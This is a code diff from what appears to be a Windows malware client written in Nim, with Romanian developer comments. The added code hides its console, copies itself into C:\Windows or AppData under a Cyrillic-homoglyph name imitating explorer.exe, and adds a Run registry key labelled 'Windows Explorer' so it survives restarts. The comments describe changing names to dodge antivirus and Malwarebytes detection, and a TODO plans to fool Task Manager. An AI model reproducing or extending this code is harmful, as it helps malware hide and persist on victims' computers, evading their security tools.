@@ -6,6 +6,7 @@ from os import joinPath
 
 import setRegKey
 import delRegKey
+import isAdmin
 
 proc run*(): void =
   # hide the console window
@@ -13,10 +14,17 @@ proc run*(): void =
 
   # copy file to appdata
   let filename: string = getAppFilename()
-  # let dest: string = getEnv("appdata").joinPath("client.exe")
-  let dest: string = r"C:\Windows\System32".joinPath("svсhоst.exe")
+  # let dest: string =
+  var dest: string
 
-  echo dest
+  if isAdmin():
+    # ma detecteaza antivirusul la windows ca svchost e
+    # scris cu chiril si seamana cu cv fisier windows
+    # trebuie sa vad sa gasesc alt nume credibil
+    dest = r"C:\Windows".joinPath("explоrer.exe")
+  else:
+    # ma detecteaza mallwarebytes daca stau in appdata
+    dest = getEnv("appdata").joinPath("explоrer.exe")
 
   # imi da crash programul daca incerc sa i dau replace dar el e deschis
   if filename != dest:
@@ -34,7 +42,7 @@ proc run*(): void =
   ## TODO: trebuie sa fac un sistem sa pacalesc taskmanagerul si sa se deschida oricand are el chef
   ## probabil pot daca sterg keyul il pun inapoi si fac asa de fiecare data cand se deschide
   setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
-      "client bla", dest)
+      "Windows Explorer", dest)
   # setRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
   #     "client bl2", dest)
   # delRegKey("Software\\Microsoft\\Windows\\CurrentVersion\\Run",
